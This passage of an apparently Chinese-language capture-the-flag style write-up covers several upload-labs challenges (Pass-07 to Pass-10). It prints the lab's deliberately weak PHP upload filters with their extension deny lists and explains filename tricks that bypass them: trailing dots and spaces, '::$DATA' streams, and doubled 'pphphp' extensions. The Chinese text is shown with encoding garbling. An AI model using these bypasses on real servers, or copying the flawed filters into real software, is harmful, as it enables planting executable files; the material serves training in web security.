class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103154218222.png" alt="image-20201103154218222"></p><p>æ²¡æœ‰åˆ é™¤<code>.</code></p><p>åœ¨Winä¸‹<code>xx.jpg[ç©ºæ ¼]</code> æˆ–<code>xx.jpg.</code>è¿™ä¸¤ç±»æ–‡ä»¶éƒ½æ˜¯ä¸å…è®¸å­˜åœ¨çš„ï¼Œè‹¥è¿™æ ·å‘½åï¼Œwindowsä¼šé»˜è®¤é™¤å»ç©ºæ ¼æˆ–ç‚¹æ­¤å¤„ä¼šåˆ é™¤æœ«å°¾çš„ç‚¹ï¼Œä½†æ˜¯æ²¡æœ‰å»æ‰æœ«å°¾çš„ç©ºæ ¼ï¼Œå› æ­¤ä¸Šä¼ ä¸€ä¸ª<code>.phpç©ºæ ¼</code>æ–‡ä»¶å³å¯</p><p><code>.php.</code>ç»•è¿‡äº†<code>$deny_ext</code>çš„éªŒè¯ï¼Œå¯¼è‡´äº†æ–‡ä»¶ä¸Šä¼ </p><h3 id="2-åˆ©ç”¨-6"><a href="#2-åˆ©ç”¨-6" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103154354669.png" alt="image-20201103154354669"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103154442779.png" alt="image-20201103154442779"></p><h2 id="Pass-08-DATAç»•è¿‡"><a href="#Pass-08-DATAç»•è¿‡" class="headerlink" title="Pass-08 ::$DATAç»•è¿‡"></a>Pass-08 ::$DATAç»•è¿‡</h2><h3 id="1-ä»£ç "><a href="#1-ä»£ç " class="headerlink" title="1. ä»£ç "></a>1. ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-08</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103154642666.png" alt="image-20201103154642666"></p><p>NTFSæ–‡ä»¶ç³»ç»ŸåŒ…æ‹¬å¯¹å¤‡ç”¨æ•°æ®æµçš„æ”¯æŒã€‚è¿™ä¸æ˜¯ä¼—æ‰€å‘¨çŸ¥çš„åŠŸèƒ½ï¼Œä¸»è¦åŒ…æ‹¬æä¾›ä¸Macintoshæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶çš„å…¼å®¹æ€§ã€‚å¤‡ç”¨æ•°æ®æµå…è®¸æ–‡ä»¶åŒ…å«å¤šä¸ªæ•°æ®æµã€‚æ¯ä¸ªæ–‡ä»¶è‡³å°‘æœ‰ä¸€ä¸ªæ•°æ®æµã€‚åœ¨Windowsä¸­ï¼Œæ­¤é»˜è®¤æ•°æ®æµç§°ä¸ºï¼š<code>$ DATA</code>ã€‚å½“æˆ‘ä»¬è®¿é—®<code>tao.php::DATA</code>æ—¶ï¼Œå°±æ˜¯è¯·æ±‚ <code>tao.php</code> æœ¬èº«çš„æ•°æ®,å¦‚æœ<code>tao.php</code> è¿˜åŒ…å«äº†å…¶ä»–çš„æ•°æ®æµï¼Œæ¯”å¦‚ <code>tao.php:test.php</code>ï¼Œè¯·æ±‚ <code>tao.php:test.php::$DATA</code>ï¼Œåˆ™æ˜¯è¯·æ±‚<code>tao.php</code>ä¸­çš„æµæ•°æ®<code>test.php</code>çš„æµæ•°æ®å†…å®¹</p><p>æ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ <code>phpinfo.php::$DATA</code>å³å¯ç»•è¿‡ã€‚(ä»…é™windows)</p><h3 id="2-åˆ©ç”¨-7"><a href="#2-åˆ©ç”¨-7" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103155458127.png" alt="image-20201103155458127"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103155333975.png" alt="image-20201103155333975"></p><p>æˆ‘ä»¬è®¿é—®çš„æ—¶å€™éœ€è¦åˆ å»<code>::$DATA</code>,ç›´æ¥è®¿é—®phpæ–‡ä»¶</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103155425946.png" alt="image-20201103155425946"></p><h2 id="Pass-09-ç©ºæ ¼-ç»•è¿‡"><a href="#Pass-09-ç©ºæ ¼-ç»•è¿‡" class="headerlink" title="Pass-09 .ç©ºæ ¼.ç»•è¿‡"></a>Pass-09 <code>.ç©ºæ ¼.</code>ç»•è¿‡</h2><h3 id="1-åˆ†æ-6"><a href="#1-åˆ†æ-6" class="headerlink" title="1. åˆ†æ"></a>1. åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç åˆ†æå¦‚ä¸‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å½“æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶åä¸º`phpinfo.php. .`æ—¶ï¼Œå› ä¸ºè¿™é‡Œtrimå¤„ç†çš„æ˜¯å­—ç¬¦ä¸¤è¾¹çš„ç©ºæ ¼ï¼Œæ‰€ä»¥$file_name=`phpinfo.php. .`</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line"><span class="comment">// ä¸Šé¢ä»£ç åˆ é™¤äº†æœ«å°¾çš„ç‚¹ï¼Œæ‰€ä»¥æ­¤æ—¶$file_name = `phpinfo.php. `, æ³¨æ„ï¼Œåé¢åˆç©ºæ ¼</span></span><br><span class="line">$file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="comment">// sttrchr æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¹¶è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦</span></span><br><span class="line"><span class="comment">// é‚£ä¹ˆ$file_ext=&quot;. &quot;</span></span><br><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">$file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">$file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æœ€ç»ˆ$file_ext=&quot;.&quot;, ç»•è¿‡æ ¡éªŒ</span></span><br><span class="line"></span><br><span class="line"> $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line"> move_uploaded_file($temp_file, $img_path);</span><br><span class="line"><span class="comment"># è¿™é‡Œæœ€ç»ˆæ–‡ä»¶åæ‹¼æ¥çš„æ˜¯$file_name,åˆ™æœ€ç»ˆä¸Šä¼ çš„æ–‡ä»¶åä¸º`phpinfo.php. `</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103163112162.png" alt="image-20201103163112162"></p><h3 id="2-åˆ©ç”¨-8"><a href="#2-åˆ©ç”¨-8" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103163729334.png" alt="image-20201103163729334"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103163556765.png" alt="image-20201103163556765"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103163602190.png" alt="image-20201103163602190"></p><blockquote><p>è¿™é‡Œè§£æåŒç†<code>Pass-06</code> and <code>Pass-07</code></p></blockquote><h2 id="Pass-10-phpåŒå†™ç»•è¿‡"><a href="#Pass-10-phpåŒå†™ç»•è¿‡" class="headerlink" title="Pass-10 phpåŒå†™ç»•è¿‡"></a>Pass-10 phpåŒå†™ç»•è¿‡</h2><h3 id="1-åˆ†æ-7"><a href="#1-åˆ†æ-7" class="headerlink" title="1. åˆ†æ"></a>1. åˆ†æ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-10</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">&quot;&quot;</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>str_ireplace() å‡½æ•°æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚</p><p>è¯¥å‡½æ•°å¿…é¡»éµå¾ªä¸‹åˆ—è§„åˆ™ï¼š</p><ul><li>å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†è¿”å›ä¸€ä¸ªæ•°ç»„ã€‚</li><li>å¦‚æœæœç´¢çš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆå®ƒå°†å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ã€‚</li><li>å¦‚æœåŒæ—¶éœ€è¦å¯¹æ•°ç»„è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ï¼Œå¹¶ä¸”éœ€è¦æ‰§è¡Œæ›¿æ¢çš„å…ƒç´ å°‘äºæŸ¥æ‰¾åˆ°çš„å…ƒç´ çš„æ•°é‡ï¼Œé‚£ä¹ˆå¤šä½™å…ƒç´ å°†ç”¨ç©ºå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢</li><li>å¦‚æœæ˜¯å¯¹ä¸€ä¸ªæ•°ç»„è¿›è¡ŒæŸ¥æ‰¾ï¼Œä½†åªå¯¹ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ï¼Œé‚£ä¹ˆæ›¿ä»£å­—ç¬¦ä¸²å°†å¯¹æ‰€æœ‰æŸ¥æ‰¾åˆ°çš„å€¼èµ·ä½œç”¨ã€‚</li></ul><p>è¯­æ³•ï¼š<code>str_ireplace(find,replace,string,count)</code></p><p>æ³¨é‡Šï¼šè¯¥å‡½æ•°æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ã€‚è¯·ä½¿ç”¨ <a href="https://www.runoob.com/php/func-string-str-replace.html">str_replace()</a> å‡½æ•°æ‰§è¡ŒåŒºåˆ†å¤§å°å†™çš„æœç´¢</p></blockquote><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>find</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å€¼ã€‚</td></tr><tr><td align="left"><em>replace</em></td><td align="left">å¿…éœ€ã€‚è§„å®šæ›¿æ¢ <em>find</em> ä¸­çš„å€¼çš„å€¼ã€‚</td></tr><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>count</em></td><td align="left">å¯é€‰ã€‚ä¸€ä¸ªå˜é‡ï¼Œå¯¹æ›¿æ¢æ•°è¿›è¡Œè®¡æ•°ã€‚</td></tr></tbody></table><p>è¿™é‡Œæ¼æ´çš„äº§ç”Ÿå‘ç”Ÿåœ¨ç¬¬9è¡Œï¼Œ<code>str_ireplace()</code>, å°†åŒ¹é…<code>$deny_ext</code>æ•°ç»„ä¸­çš„å­—ç¬¦æ›¿æ¢<code> </code>, è€Œè¿™é‡Œåªè¿›è¡Œäº†ä¸€æ¬¡æ›¿æ¢ï¼Œä¹ŸåŠå°†è¿™é‡Œ<code>$file_name</code> è®¾ç½®ä¸º<code>pphphp</code> é€šè¿‡ä¸€æ¬¡<code>str_ireplace()</code>çš„æ›¿æ¢ï¼Œ<code>$file_name</code>çš„å€¼å°†ä¸ºç­‰äº<code>php</code>, å³å¯ç»•è¿‡</p><h3 id="2-åˆ©ç”¨-9"><a href="#2-åˆ©ç”¨-9" class="headerlink" title="2. åˆ©ç”¨"></a>2. åˆ©ç”¨</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103165931459.png" alt="image-20201103165931459"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103165958896.png" alt="image-20201103165958896"></p><p><code>phpinfo.pphphp</code> -&gt; <code>info.php</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103170431998.png" alt="image-20201103170431998"></p><p>Qï¼šä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ç§æƒ…å†µå‘¢ï¼Ÿ</p><p>Aï¼šæˆ‘ä»¬å¯ä»¥ç†è§£ä¸º<code>str_ireplace()</code>å‡½æ•°åŒ¹é…æ˜¯ä»å¤´åˆ°å°¾ï¼Œè€Œä¸”åªåŒ¹é…ä¸€éï¼Œä¸‹é¢çš„ä»£ç 